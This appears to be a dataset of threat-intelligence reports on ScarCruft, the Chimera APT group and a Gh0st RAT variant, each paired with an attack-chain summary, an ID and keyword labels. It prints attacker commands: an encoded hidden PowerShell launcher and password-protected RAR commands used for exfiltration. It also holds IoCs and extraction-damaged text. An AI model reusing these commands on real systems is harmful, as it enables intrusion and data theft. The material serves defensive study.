communicates; Download; addition; commands; Received; data; HTTP; execution; detection.
"5/14/2019ScarCruft continues to evolve, introduces Bluetooth harvester | SecurelistScarCruft continues to evolve, introduces Bluetooth harvestersecurelist.com/scarcruft-continues-to-evolve-introduces-bluetooth-harvester/90729By GReAT Executive summary After publishing our initial series of blogposts back in 2016, we have continued to track the ScarCruft threat actor. ScarCruft is a Korean-speaking and allegedly state-sponsored threat actor that usually targets organizations and companies with links to the Korean peninsula. The threat actor is highly skilled and, by all appearances, quite resourceful.We recently discovered some interesting telemetry on this actor, and decided to dig deeper into ScarCruft’s recent activity. This shows that the actor is still very active and constantly trying to elaborate its attack tools. Based on our telemetry, we can reassemble ScarCruft’s binary infection procedure. It used a multi-stage binary infection to update each module effectively and evade detection. In addition, we analyzed the victims of this campaign and spotted an interesting overlap of this campaign with another APT actor known as DarkHotel. Multi-stage binary infection The ScarCruft group uses common malware delivery techniques such as spear phishing and Strategic Web Compromises (SWC). As in Operation Daybreak, this actor performs sophisticated attacks using a zero-day exploit. However, sometimes using public exploit code is quicker and more effective for malware authors. We witnessed this actor extensively testing a known public exploit during its preparation for the next campaign.In order to deploy an implant for the ﬁnal payload, ScarCruft uses a multi-stage binary infection scheme. As a rule, the initial dropper is created by the infection procedure. One of the most notable functions of the initial dropper is to bypass Windows UAC (User Account Control) in order to execute the next payload with higher privileges. This malware uses the public privilege escalation exploit code CVE-2018-8120 or UACME which is normally used by legitimate red teams. Afterwards, the installer malware creates a downloader and a conﬁguration ﬁle from its resource and executes it. The downloader malware uses the conﬁguration ﬁle and connects to the C2 server to fetch the next payload. In order to evade network level detection, the downloader uses steganography. The downloaded payload is an image ﬁle, but it contains an appended malicious payload to be decrypted.url continues to evolve, introduces Bluetooth harvester | SecurelistMulti-stage binary infectionThe ﬁnal payload created by the aforementioned process is a well known backdoor, also known as ROKRAT by Cisco Talos. This cloud service-based backdoor contains many features. One of its main functions is to steal information. Upon execution, this malware creates 10 random directory paths and uses them for a specially designated purpose. The malware creates 11 threads simultaneously: six threads are responsible for stealing information from the infected host, and ﬁve threads are for forwarding collected data to four cloud services (Box, Dropbox, Pcloud and Yandex). When uploading stolen data to a cloud service, it uses predeﬁned directory path such as /english, /video or /scriptout.Cloud-based backdoorThe same malware contains full-featured backdoor functionality. The commands are downloaded from the /script path of a cloud service provider and the respective execution results are uploaded to the /scriptout path. It supports the following commands, which are enough to fully control the infected host:url continues to evolve, introduces Bluetooth harvester | SecurelistGet File/Process listing Download additional payload and execute Execute Windows command Update conﬁguration data including cloud service token information Save screenshot and an audio recordingThe ScarCruft group keeps expanding its exﬁltration targets to steal further information from infected hosts and continues to create tools for additional data exﬁltration. During our research, we conﬁrmed that they have an interest in mobile devices.We also discovered an interesting piece of rare malware created by this threat actor – a Bluetooth device harvester. This malware is responsible for stealing Bluetooth device information. It is fetched by a downloader, and collects information directly from the infected host. This malware uses Windows Bluetooth APIs to ﬁnd information on connected Bluetooth devices and saves the following information.Instance Name: Name of device Address: Address of device Class: Class of the device Connected: Whether the device is connected(true or false) Authenticated: Whether the device is authenticated(true or false) Remembered: Whether the device is a remembered device(true or false)The attackers appear to be increasing the scope of the information collected from victims.Build path of Bluetooth information harvesterVictimology We have found several victims of this campaign, based on our telemetry – investment and trading companies in Vietnam and Russia. We believe they may have some links to North Korea, which may explain why ScarCruft decided to closely monitor them. ScarCruft also attacked a diplomatic agency in Hong Kong, and another diplomatic agency in North Korea. It appears ScarCruft is primarily targeting intelligence for political and diplomatic purposes.url continues to evolve, introduces Bluetooth harvester | SecurelistVictimology of this campaignOverlap with other actors We discovered one victim from Russia that also triggered a malware detection while staying in North Korea in the past. The fact that this victim visits North Korea makes its special and suggests that it may have valuable information about North Korean affairs. ScarCruft infected this victim on September 21, 2018. But before the ScarCruft infection, however, another APT group also targeted this victim with the host being infected with GreezeBackdoor on March 26, 2018.GreezeBackdoor is a tool of the DarkHotel APT group, which we have previously written about. In addition, this victim was also attacked by the Konni malware on 03 April 2018. The Konni malware was disguised as a North Korean news item in a weaponized documents (the name of the document was “Why North Korea slams South Korea’s recent defense talks with U.S-Japan.zip”)Infection timelineThis is not the ﬁrst time we have seen an overlap of ScarCruft and DarkHotel actors. Members from our team have already presented on the conﬂict of these two threat actors at security conferences. We have also shared more details with our threat intelligence customers in the past. They are both Korean-speaking threat actors and sometimes their victimology overlaps. But both group seem to have different TTPs (Tactics, Techniques and Procedures) and it leads us to believe that one group regularly lurks in the other’s shadow. Conclusionsurl continues to evolve, introduces Bluetooth harvester | SecurelistThe ScarCruft has shown itself to be a highly-skilled and active group. It has a keen interest in North Korean affairs, attacking those in the business sector who may have any connection to North Korea, as well as diplomatic agencies around the globe. Based on the ScarCruft’s recent activities, we strongly believe that this group is likely to continue to evolve. For more information please contact: intelreports@kaspersky.com Appendix I – Indicators of CompromiseFile hashes (malicious documents, Trojans, emails, decoys) E88f7f285163d0c080c8d3e525b35ab3 Simple HTTP Downloader D7c94c5ba028dc22a570f660b8dee5b9 Simple HTTP Downloader A6bd2cf7bccf552febb8e8347d07529a Simple HTTP Downloader url url url url url url url url url url url urlﬁles/ﬁle/sliderpic.jpg url url urlﬂy.000webhostapp[.]com/userﬁles/ﬁle/sliderpic.jpgDomains and IPsbuttyﬂy.000webhostapp[.]com planar-progress.000webhostapp[.]com 120.192.73[.]202 180.182.52[.]76url ","1. Initial intrusion via spear phishing or strategic web compromises, sometimes using zero-day exploits. 2. Installs initial dropper malware that bypasses Windows UAC. 3. Dropper installs downloader malware. 4. Downloader connects to C2 server to fetch next stage payload. Uses steganography to hide communications. 5. Final ROKRAT backdoor payload is installed. 6. ROKRAT steals information from the infected system and exfiltrates it to cloud storage services. 7. ROKRAT can also download additional modules like the Bluetooth device info harvester. 8. Harvested info and stolen data is retrieved by the attackers from the cloud services. 9. ROKRAT backdoor allows full control of infected hosts via command execution, screenshot capture, etc. 10. Throughout the infection, the malware is updated via the C2 server to evade detection and expand capabilities. ",valid_86,"['us', 'Strategic Web Compromises', 'zero-day', 'Dropper', 'Windows UAC', 'downloader malware', 'steganography', 'ROKRAT', 'information', 'addition', 'Bluetooth', 'device', 'stolen data', 'the attackers', 'infected hosts', 'execution', 'APT', '10', 'the infection', 'the malware', 'Update', 'the C2 server', 'detection']",us; Strategic Web Compromises; zero-day; Dropper; Windows UAC; downloader malware; steganography; ROKRAT; information; addition; Bluetooth; device; stolen data; the attackers; infected hosts; execution; APT; 10; the infection; the malware; Update; the C2 server; detection.
"IntroductionChimera APT Threat Report(SEMI),the globalThis threat report provides an analysis of the advanced persistent threat (APT) attacks that have occurred during the past two years on the semiconductor industry. Our research shows that the majority of these attacks were concentrated on the Taiwan semiconductor sector. This is worthy of concern, as Taiwan’s semiconductor industry plays a very crucial role in the world. Even a small disruption in the supply chain could have a serious ripple effect throughout the entire industry. Surprisingly, up until now, there has been less coverage on these attacks. In this report, we seek to shed light on the threat actors and campaigns of these attacks, where they are collectively referred to as  Operation Skeleton Key . Additionally, we provide a brief overview of the current information security status of Taiwan’s semiconductor industry. With decades of development, Taiwan has established itself as a leading player in the semiconductor supply chain, including many well-known leaders in the area. According to a report by the Semiconductor Equipment and Materials International association representing the electronics manufacturing supply chain, Taiwan has been the largest consumer of semiconductor materials in the past several years [1]. Meanwhile, Wikipedia, says that Taiwan is currently among the top 5 sales leaders in multiple segm ents including foundry, integrated device manufacturer (IDM), fabless and outsourced semiconductor assembly and testing (OSAT) [2]. In 2019, Taiwan’s total semiconductor value reached a staggering $11.4 billion. Needless to say, the repercussions from a cyber attack on Taiwan’s semiconductor sector could be catastrophic.Due to the high market value of the semiconductor industry, vendors have invested heavily in their cyber capabilities, especially in protecting the industrial control system (ICS) equipment used in fabrication plants. Although operational technology (OT) and information technology (IT) security is equally important, more emphasis has been placed on the former. This is evidenced by the fact that many vendors have opted to isolate their ICS equipment to ensure the manufacturing process is never interrupted. The downside to this approach is that once malicious code finds its way into the isolated environment, it can spread to other machines very quickly. One foremost example is the 2018 WannaCry ransomware attack on TSMC [3]. The hit on the world’s largest foundry company forced some of the plants to go offline for an entire day. Additionally, it took several days before the malware could be fully eradicated. The total damage caused by this attack reached $256 million. Separately, ASUS, which is a leading PC manufacturer in Taiwan, saw millions of its users impacted by  Operation ShadowHammer [4]. In this report, we will show how IT attacks on semiconductor vendors can be just as damaging as an OT attack. Between 2018 and 2019, we discovered several attacks on various semiconductor vendors located at the Hsinchu Science-based Industrial Park in Taiwan. As these attacks employed similar attack techniques and tactics, a pattern could be discerned from the malicious activities. From this pattern, we deduced that these attacks, which we dubbed  Chimera APT Group , were actually conducted by the same threat actor. The main objective of these attacks appeared to be stealing intelligence, specifically documents about IC chips, software development kits (SDKs), IC designs, source code, etc. If such documents are successfully stolen, the impact can be devastating. The motive behind these attacks likely stems from competitors or even countries seeking to gain a1competitive advantage over rivals. Since these techniques and tactics were similar to previous attack activities, we suspect the attacker is a China-based hacker group. We thus hope that this report will help semiconductor companies gain a better understanding of the dangers from such attacks. Additionally, as we have worked with several of the semiconductor vendors to improve their cyber security, we wish to share this valuable experience, and highlight the current challenges facing the entire industry.In this report, we conduct a comprehensive analysis on the employed technologies, tactics, and customized malware of  Chimera APT Group . As this operation has not yet been documented, the techniques and tactics disclosed in this report can help blue teams design better defenses, and develop better detection and hunting methods. Below summarizes our findings of  Chimera .1. A unique- SkeletonKeyInjectoraccount manipulation malware– was used. SkeletonKeyInjector contained code extracted from Dumpert and Mimikatz. This malware implanted a skeleton key into domain controller (DC) servers to continuously conduct lateral movement (LM). Additionally, by making direct syscalls, the malware could bypass security products based on API hooking. This malware was discovered in the two cases mentioned in this report.2. The threat actor utilized Cobalt Strike as their main remote-access Trojan (RAT). The mutated Cobalt Strike backdoor replaced and masqueraded as Google Update to confuse users. Additionally, as most corresponding (command and control) C2s were located in the Google Cloud Platform, it made it difficult to attribute the actor. Aside from the two cases mentioned in this report, we also detected the presence of this malware in other semiconductor vendors.3. Chimera used an old and patched version of RAR for data exfiltration. The same binary wasfound in the two cases mentioned in this report.Storyline of the OperationDuring our investigation of  Chimera APT Group between 2018 to 2019, more than 30,000 endpoints belonging to various semiconductor vendors were analyzed.   Two representative cases were chosen for a deeper analysis. The two cases (hereafter Case A and Case B) involved in the analysis currently have a leading global position in their own market segments. With business sites scattered around the world and a large annual revenue, their main research and development hub are both located in Taiwan. Two different approaches were adopted when investigating the two companies. For Case A, as we already enjoyed a long-term cooperation, our assistance focused on monitoring their systems. This allowed us to quickly identify the cyber attack in a short period of time. By contrast, as victims in Case B discovered on their own various abnormal activities, they asked for our help to formulate an effective incident response. During our forensic investigation, we found that the attacks had already been occurring for more than a year. As the activities, attack techniques and tactics were similar in the other cases we investigated, we believe this was the work of the same threat actor.Case A:In this case, the victim company had already subscribed to our continuous threat hunting2investigation revealed malicious activities occurring between 2019-12-09 ~ 2019-12-10. Meanwhile, in this incident, 15 endpoints and 6 user accounts were compromised, and 4 malwares and 8 C2 servers were found.To help better depict the operational details of this case, the cyber situation graph and storylineis respectively shown in Fig 1. Note that all the server/user names are de-identified, and replaced with names that can represent their roles.Figure 1: Storyline in Case A3The same APT malware - GoogleUpdate.exe - was found on two endpoints. On the day we discovered this malware, no information could be found on VirusTotal (VT). To confuse security products and analysts, the malware replaced the original GoogleUpdate binary and functioned as a mutated Cobalt Strike beacon to inject payloads into other processes. Moreover, network security devices had difficulty detecting the associated C2 servers, as they were located in the Google Cloud Platform. The C2 server domains are listed in Appendix I of the IoC section.After successfully connecting back to the C2, the attacker used RECORDEDTV.MS to archive the stolen data for data exfiltration. It is worthy to note that even without the .exe file extension, the data exfiltration process could still be executed. Identical binaries were found in several machines, but under different names, e.g. RECORDEDTV.MS, uncheck.dmp, and jucheck.exe. This aroused our suspicions and prompted us to suspect the binary was masquerading as a Java Update program. Inserting malware in a location where legal software is stored seems to be a characteristic tactic of Chimera . For this case, it was found that the disguised program, which was a modified RAR software, had a one-byte discrepancy from the original version. We are still ascertaining the reasons behind this difference.To track the root cause, we found thatthe first Cobalt Strike backdoor was located at NB-CLAIR, and was then remotely copied to Server-LAUREN. A valid account was used to invoke Cobalt Strike via schtasks (Fig 2).Figure 2: schtask is used to lateral movement4The recon activities in Server-LAUREN are illustrated in the figure below. Several ""net user” commands were executed for recon purposes, and the results were saved to the RecordedTV_lib.log (Fig 3).Figure 3: Reconnaissance commandsOur analysis also showed that Server-LAUREN used wmic to remotely execute variouscommands in another endpoint to check if there was an Internet connection (Fig 4).Figure 4: Reconnaissance via wmic5Server-LAUREN also archived the registry and ntds.dit to other hosts for offline breaking. The latter is an AD database, which contains information about domain hosts and users, e.g. id, name and password hash. Since this file was encrypted, and the key was stored in the SYSTEM registry, the threat actor needed to archive both ntds.dit and the registry to both decrypt the file and remotely brute-force the password hash. The control of Server-LAUREN , which was also achieved via schtasks, was traced back to the NB-CLAIR machine. From the NB-CLAIR timeline, we noticed that a remote desktop program (RDP) from a certain IP was run just six minutes before the schtasks was executed (Fig 5). Since this IP was a VPN server, and a valid account was used to log in to it, we believe the actor acquired the password from a separate data breach.Figure 5: Overall activitiesAt the end of the attack, the wlanapi.dll malware, which we dubbed SkeletonKeyInjector, was used for persistence. More details of the malware reversing will be provided in  Sec. 4 Malware Reversing .6Case B:Suspicious activities were discovered in the victim company of Case B during an upgrade to their network infrastructure. We were tasked by the company to investigate this incident, which began in November 2019. During our investigation, we found that the cyber attack pattern resembled the tactics employed by  Chimera . The entire attack occurred between October 7, 2018 to November 18, 2019, and a total of 24 endpoints were compromised. In these endpoints, 8 compromised accounts, 3 malware and 5 C2 servers were discovered. The persistence of this attack can be seen by the fact that it lasted for more than a year. The cyber situation graph and storyline are respectively shown in Fig 6 and Fig 7.Unlike Case A, powershell scripts were widely used, which can be seen in following code snippets. To avoid the file-based detection mechanism, the payload was injected directly into the system memory. The injected malware was discovered in roughly 10 endpoints, which included two domain controllers. The powershell script was a Cobalt Strike backdoor and was used for process migration to other system processes. We found several hosts that had the Cobalt Strike malware implanted in their infected svchost.exe. Despite the discovery of the early stage malware and activities, the launch of our investigation was already at a very late point in time. Thus, there was insufficient evidence to pinpoint the likely initial access point. We surmise that the attack occurred via stolen valid credentials or phishing emails.powershell -nop -w hidden -encodedcommandJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEM wAEYATQB5AFUAaABtAGQAUgBWAEoAeABSADQAVABQ7Figure 6: Storyline of Case B8Figure 7: Cyber situation graph of Case BAs mentioned earlier, legal cloud services were widely used by  Chimera as their C2 to avoid threat attribution. In this case, Appspot[.]com and azureedge[.]net were applied as the C2. The actor also used a RAR program under the guise of innocuous file names such as RecordedTV.ms, jucheck.exe and vmware.log to archive and steal the data of interest. A similar scheme was utilized by the attacker to archive the passwords they used. The following shows a sample command of the archived information.c:\users\xxxx\libraries\RecordedTV.ms a -m5 -v71m -hpfuckyou.google.com11 vmlum-vss.logvmlum-vmvss.logC:\Windows\system32\cmd.exe /C c:\users\xxxxxx\libraries\RecordedTV.ms a -m5 -r-hpfuckyou.google.com11 vmlum-vmopt.log “\\<Hostname>\personal\<Username>\<Product>-Traning-v1.1.pptx"" > vmlumss.log & dir vmlum-vmopt*Leaked File NameBased on the file names of the stolen files, it seemed to include chip documents, SDKs and even the source code. The key motive of the actor was to acquire semiconductor proprietary data. Similar to Case A, a DLL file (d3dll.dll) was used to deploy a Skeleton Key malware. An in-memory patch was performed to allow easy system log-in. Some of the de-identified leaked file names are listed below.\\Users\<Account>\Project\Roadmap \\Users\<Account>\Backup\Workspace \\Users\<Account>\chip and SDK setting \\Users\<Account>\<Productname> SDK Installation guide.pdfIt is worthy to note that among the various semiconductor vendors we investigated, similarities were seen in the deployed malware, techniques, and tactics. This particular APT group seemed to9have a keen interest in targeting the semiconductor industry. Additionally, in the absence of an AD monitoring system, we saw some vendors employing a white-list enforcement approach. Although this is a feasible approach, as the AD cannot execute any software outside the white-list, our investigation shows that APT actors were still able to use Living off the Land Binaries (LOL) bins to launch an attack. Malware ReversingOur analysis also revealed several suspicious memory modules. The first memory module resembled a CobaltStrike or metasploit beacon. The memory module was a PE file with a broken header, as seen in Fig 8 and Fig 9. From the figure, we can also see that the PE metadata has some invalid values, which contains a hidden shellcode (from offset 2).Figure 8: Raw content of the memory moduleFigure 9: PE information10The disassembled shellcode, which is a Reflective Loader, is listed in Fig 10. It first locatedthe next payload at offset 0x1791C, and then loaded the payload. Meanwhile, 56A2B5F0 is the API hash of ExitProcess, which denotes the process exit.Figure 10: Reflective loader shellcodeThe other memory modules contained a different CobaltStrike beacon, and were used for migration. The first stage beacon injected a payload to a process for process migration. From the memory content (Fig 11), the “.\pipe\mojo.5688.805…” string was the pipe created by the CobaltStrike beacon.Figure 11: Partial content in memory moduleAs we performed a deeper reverse engineering, we found that the process migration made use of the pipe inter-process (IPC) mechanism for communication. The injected code first used CreateNamePipe and ConnectNamePipe to establish an IPC with the original beacon (Fig 12). After reading the entire shellcode via the ReadFile from the name pipe, the shellcode was invoked in related binary led us to initially believe the sample was a Dumpert. However, a more in-depth analysis revealed that the d3d11.dll sample implanted a skeleton key, where adversaries could persistently control (before the system reboot) the infected machine and machines under the infected AD. More specifically, the malware was an account manipulation tool that contained code extracted from both Dumpert and Mimikatz. We called this malware SkeletonKeyInjector. The malware employed a technique that altered the NTLM authentication program and implanted a skeleton key to allow adversaries to log-in without a valid credential. This allowed the adversary to achieve the following objectives:● Persistence: After the code in memory was altered, the adversary could gain access to the compromised machines before the next system reboot. As AD machines are rarely rebooted, the adversary was able to control the machines for a very long time.● Defense Evasion: Aside from the different login password and login algorithm scheme, there was no difference when compared to a normal login activity. Furthermore, normal users could still log-in to the system via their original password. Thus, the probability of being exposed was low.● Lateral Movement: Adversaries could use the skeleton key to log in to other machines that were in the same domain. This made it easier for an adversary to conduct lateral movement.To show which functions shared a resemblance to Mimikats or Dumpert, we reversed the functions of d3d11.dll and recovered the function names in Fig 14. For easy understanding, we recovered the function names that migrated from Mimikatz, which have either the “kuhl” or “kull” prefix. As for functions that migrated from Dumpert, the prefix “Dumpert” was included in the name. For functions that were implemented by the adversary, no prefix was added.13Figure 14: Reversed function namesIn order to bypass the API monitoring, which is widely used in anti-virus or EDR products, the malware directly invoked syscalls and implemented high level API logic. Since the syscall numbers differ between each Windows version, the following code snippet was used to determine the OS version in use, and thereby obtain the correct syscall number. Our analysis showed that this code snippet was copied from Dumpert.Figure 15: Dumpert detect OS version capabilitycodesnippet usedby the malware,a privilegecalled14run the MimikatzToSE_DEBUG_PRIVILEGE was needed. The code shown in Fig 16 used RtlAdjustPrivilege to obtain the SE_DEBUG_PRIVILEGE to allow the malware to open, read, and write other process memory as a debugger. By comparing the code snippet (Fig 17) with the original code in Mimikatz (Fig 18), we found that instead of calling the OpenProcess API, the malware instead invoked OpenProcess via Dumpert. As mentioned earlier, the malware sought to bypass the API hooking via syscalls.Figure 16: SE_DEBUG_PRIVILEGESkeletonKeyInjector first searched for the string “Kerberos-Newer-Keys” in the lsass.exe process memory. When the “Kerberos-Newer-Keys” address was found, it then searched for the Unicode structure in the memory that referenced this address. Afterwards, the Unicode structure was altered with empty strings by manipulating the string reference to an empty string and size zero. This manipulation downgraded the lsass.exe in using insecure crypto scheme - RC4 without salt. From Fig 17 and Fig 18, the similar code segments between Mimikatz and d3d11.dll are shown.Figure 17: SkeletonKeyInjector Code Snippet I15Figure 18: Similar code in MimikatzFigure 19: Code of SkeletonKeyInjector to patch the CDLocateCSystemAfterdowngradingto RC4, the SkeletonKeyInjector alteredfunction pointers in cryptdll.dll!CDLocateCSystem by redirecting them to its customized functions (Fig 19). Specifically, two functions were altered, one for the RC4 initialization, and the other for the RC4 decryption. In the RC4 initialization function, a new RC4 NTLM was injected with a pre-calculated hash value of the skeleton key. When the authentication check failed due to incorrect credentials, the RC4 decryption function prompted the authentication process to compare the credentials with the skeleton key. Once a match was confirmed, the log in was permitted. Noteworthy, the malware 23. However, we are still determining the reason why a byte size data was altered. All of the cases that we investigated used this modified rar.exe program to archive the stolen data, which is testing tool. We suspect this program was not developed by the adversary, but was obtained from a benign source. Used by the adversary for network reconnaissance, it is unlikely to be flagged by security systems, as the program may be inherently benign.Figure 24: Code snippet of BaseClient.exe19In this chapter, we summarize the techniques employed in  Chimera APT . These techniques areMITRE ATT&CK Techniquesorganized based on the MITRE ATT&CK framework. 6Scheduled Task The threat actor leveraged scheduled tasks toT105 3Description The threat actor’s first entry point was from a VPN server, where a valid account was used. We believe the actor acquired the password from a separate data breach to login to the VPN. The threat actor used wmi to remotely execute commands on another endpoint for reconnaissance, primarily checking the Internet connection availability. The threat actor used a Cobalt Strike powershell script for process migration to other system processes. Meanwhile, BloodHound was used to assess the privilege settings in the Active Directory (AD) domain and devise attack paths.launch APT malware to a remote system using domain controller account credentials. After the execution, the threat actor removed the scheduled task information to hide the system artifact. The discovered memory module showed that Cobalt Strike conducted process injection to migrate to other processes. The 'net user' commands were used to recon user information. The final results were dumped to RecordedTA_lib.log. NTDS from Domain Controller, threat actor collected registry and ntds.dit in other hosts from the domain controller for offline breaking. The threat actor merged code from dumpert and mimikatz to dump system credentials, which was hard to detect by security products. The threat actor used Skeleton key to inject20Defense DumpingPersistenc T109 Accounte8Manipulationfalse credentials into domain controllers with the intent of creating a backdoor password. This stealthy technique was hard to detect. The threat actor used a valid account to remotely login to the system.The threat actor used windows admin share to collect and LM to remote system. The threat actor widely used Google’s appspot to host their C2 servers.Remote nData Encrypted One characteristic of the threat actor wasData Compressedusing “fuckyou.google[.]com” as the password to encrypt the stolen data. This program was a modified RAR software, where there was a one byte inconsistency over the original version.21ConclusionFor nearly two years, our team monitored several attacks that targeted Taiwan’s semiconductor vendors. We believe these attacks originated from the same threat actor -  Chimera , as these attacks techniques and even the same customized malware. The actor likely utilized similar tactics, harvested various valid credentials via phishing emails or data breaches as their starting point to conduct their cyber attack on the vendors. CobaltStrike was later used as their main RAT tool. To avoid detection, the CobaltStrike RAT was often masqueraded as a Google Chrome Update. The RAT would then connect back to their C2 server. As these servers were in a public cloud server, it made it difficult to track. Subsequently, by compromising the AD server, the delicate malware - SkeletonKeyInjector - was invoked to implant a general key to allow LM, persistence and defense evasion. Although this malware was discovered for the first time, we have high confidence that these attacks were conducted by the same threat actor. Based on the stolen data, we infer that the actor’s goal was to harvest company trade secrets. The motive may be related to business competition or a country’s industrial strategy. We hope that the tactics, techniques and IoCs disclosed by this report can better help semiconductor vendors improve their security mechanisms and prevent such attacks from occurring again.22Reference1. url 2. url 3. url  4. url I : IoC ListMalwareHashf2d4a35f20cd92c13cab8f6a50995 C2 DomainDescriptionCobaltStrike backdoorCobaltStrike backdoorArchive Tool (Greyware)PersistencePersistencechrome-applatnohp.appspot[.]comussdns04.heketwe[.]comussdns01.heketwe[.]com78276.ussdns02.heketwe[.]com78276.ussdns01.heketwe[.]com2425 "," 1. The attack starts with phishing emails to gain initial access and valid credentials. 2. Cobalt Strike is used as the main malware, often disguised as Google Update. 3. Cobalt Strike connects to command and control servers on Google Cloud Platform. 4. SkeletonKeyInjector is used to manipulate accounts and implant skeleton keys on domain controllers. 5. SkeletonKeyInjector allows lateral movement and persistence in the compromised network. 6. The modified RAR tool RecordedTV.ms is used to archive and exfiltrate stolen data. 7. Stolen data focuses on documents and source code for IC chip designs and other intellectual property. 8. The exfiltrated data is likely used to benefit semiconductor competitors or state interests. ",valid_35,"['the attack', 'phishing emails', 'initial access', 'valid credentials', 'Cobalt Strike', 'use', 'Malware', 'Google Update', 'command', 'servers', 'Google Cloud Platform', 'SkeletonKeyInjector', 'IP', 'accounts', 'Skeleton Key', 'domain controllers', 'lateral movement', 'persistence', 'RAR', 'tool', 'RECORDEDTV.MS', 'RAT', 'Stolen data', 'documents', 'source code', 'OT', 'competitors', 'interest']",the attack; phishing emails; initial access; valid credentials; Cobalt Strike; use; Malware; Google Update; command; servers; Google Cloud Platform; SkeletonKeyInjector; IP; accounts; Skeleton Key; domain controllers; lateral movement; persistence; RAR; tool; RECORDEDTV.MS; RAT; Stolen data; documents; source code; OT; competitors; interest.
"Decoding network data from a Gh0st RAT variantnccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/april/decoding-network-data-from-a-gh0st-rat-variant/During a forensic investigation in March 2018 we were able to retrieve some files which appeared to be linked with a well-known group named Iron Tiger.From our research, we believe that the perpetrator hasn’t shown any advanced technical capabilities in this attack. In fact, the main goal was to mine cryptocurrency. During the investigation we found several tools such as password dumpers, Monero cryptocurrency miners, portable executable (PE) injectors and a modified version of Gh0st RAT. Even though Bitdefender and TrendMicro have published reports [1] [2] describing some of the tools used by the group, we were not able to find any references to this specific modified version of Gh0st RAT. Therefore, the purpose of this blog is to briefly describe the modified Gh0st RAT version that is used by the group.The malicious payload Firstly, a malicious executable file is executed which will drop a batch file (install.bat) and a cabinet file (data.cab) under a new folder in C:\ProgramData with a random name. The cabinet file includes two files: the malicious shellcode which is partially encrypted and a Dynamic-link library (DLL) which will execute the malicious shellcode. The malicious executable file will then execute the batch file, which will decompress and execute the DLL file. Persistence is achieved by creating a new service or a new registry key, depending on the privileges that the malware has.Once the execution is passed to the shellcode, it will decrypt the rest of the encrypted data using a single byte as the key in an eXclusive OR (XOR) loop. After decryption, the following interesting string is observed:Microsoft.Windows.BNG|[C&C IP address]:443;|1;1;1;1;1;1;1;|00-24;|1The main goal of the shellcode is to load and execute the attacker’s plugins in memory.Modified Gh0st RAT While analysing the previous files, we found a folder named ‘Plugins’ with some interesting DLLs inside and two files which required a password upon execution (example in Figure 1).1/7Figure 1: Password inputAfter reversing the binary, we found out that the password is not hardcoded. Instead, the password is based on the current year and month. For example, the password for the month of March in 2018 is ‘201803’.The first file which is named ‘Noodles’ seems to be an old modified version of Gh0st RAT based on compilation date and features. The second file named ‘Mozilla’ is the primary tool which was used for this attack. Below you can see how both panels look.Figure 2: Noodles Panel - Listener Settings2/7Figure 3: Mozilla Panel – Connect SettingsCurrently, both tools can listen on any given ports but only ‘Mozilla’ can connect to a bind port. The supported protocols include Secure Sockets Layer (SSL) and Transmission Control Protocol (TCP). One of the protocols in the list is named, according to the malware authors, ‘WINNET’ but this is not supported yet and an error message is displayed. This might suggest that this tool is still in development and there are plans to add additional functionality.Figure 4: WININET protocol not supportedAdditionally, analysis of the Mozilla tool identified a Program database (PDB) path inside the binary:K:\Mozilla\Mozillav6.0.x_dll\WorkActive\Release\Mozilla.pdbThe tool heavily relies on plugins. When there is a new victim connection, the attacker can use the PluginManager to load new plugins to the infected machine.3/7Figure 5: “Mozilla” Plugin ManagerMost of the available plugins are based on the Gh0st RAT source code and a summary of them can be found below:4/7Network communication The network traffic between the victim and the attacker is encrypted using Rivest Cipher 4 (RC4). The key is unique for each request and is encrypted using ‘XOR’ and ‘AND’ instructions. The key is stored in the first 28 bytes of the request. We wrote a Python script that takes as input a network capture (PCAP) and decrypts it, which can be found in our Github repository here: url Defence/tree/master/Scripts/gh0st_variant_c2For example, below we can see the initial connection between a victim and the C2 server, where the machine name is sent:Data to server 5/7[i] Found key: C8410061440A01c762FA9000 00000000: 0501570049004E00 2D00510047004F00 W.I.N.-.Q.G.O. 00000010: 3400430051004E00 49004F004E003500 4.C.Q.N.I.O.N.5.And below the distinctive start of a PE file is seen, as a plugin is transferred to the client.Data to client [i] Found key: C841006804EC089c84EA9020 00000000: 4D5A900003000000 04000000FFFF0000 MZ 00000010: B800000000000000 4000000000000000 @ 00000020: 0000000000000000 0000000000000000 00000030: 0000000000000000 00000000F0000000 00000040: 0E1FBA0E00B409CD 21B8014CCD215468 ! L.!Th 00000050: 69732070726F6772 616D2063616E6E6F is program canno 00000060: 742062652072756E 20696E20444F5320 t be run in DOS 00000070: 6D6F64652E0D0D0A 2400000000000000 mode $ IOCs C:\ProgramData\Rascon C:\ProgramData\TrkSvrMalicious service name:HIDMgr RasconMan TrkSvrRegistry key for persistence:‘rundll32.exe_malicious_DLL_path’ in ‘HKCU\Software\Microsoft\Windows\CurrentVersion\Run’File names and hashes:FilenameHash(SHA-256)Mozilla.exeEE04B324F7E25B59D3412232A79D1878632D6817C3BB49500B214BF19AFA4E2CUpdateproxy.dll 0BA49FEB7784E6D33D821B36C5C669D09E58B6795ACA3EEBBF104B763B3B3C20Telnet.dllSocks.dllShell.dll33B7407E534B46BF8EC06D9F45ECD2D3C7D954340669E94CD7CEDCBAE5BAD2DD6160AF383794212B6AD8AB9D6D104BBE7AEFB22410F3AB8EA238F98DABFC48B7C63B01C40038CA076072A35913F56D82E32FCEE3567650F3392B5C5DA00045486/7FilenameHash(SHA-256)Session.dllD51EC4ACEAFA971E7ABD0CF4D27539A4212A448268EF1DB285CD9CE9024D6EB3Screen.dllBD8086DE44E16EFDD380E23E49C4058D956538B01E1AE999B679B6B76B643C7DPort.dllFile.dllB44A9545B697B4D46D5B96862A6F19EA72F89FED279F56309B2F245AC8380BE0F4DF97108F18654089CFB863F2A45AA41D17A3CE8A44CCCC474F281A20123436ConEmu.exeD31D38403E039F5938AE8A5297F35EB5343BB9362D08499B1E07FAD3936CE6F7Noodles.exeA591D4D5B8D23FF12E44A301CE5D4D9BF966EBA0FC0068085B4B4EC3CE352963Coal.exe (Malicious executable)Abg.exe (Malicious executable)23d.exe (Malicious executable)89d.exe (Malicious executable)EEBFF21DEF49AF4E85C26523AF2AD659125A07A09DB50AC06BD3746483C89F9D97B9D7E16CD6B78A090E9FA7863BD9A57EA5BBE6AE443FA788603EEE5DA0BFC3B6C21C26AEF75AD709F6C9CFA84BFA15B7EE709588382CE4BC3544A04BCEB661DB9B9FA9EFA53662EC27F4B74B79E745F54B6C30C547A4E5BD2754E9F635F6DBReferences1. url 2. url 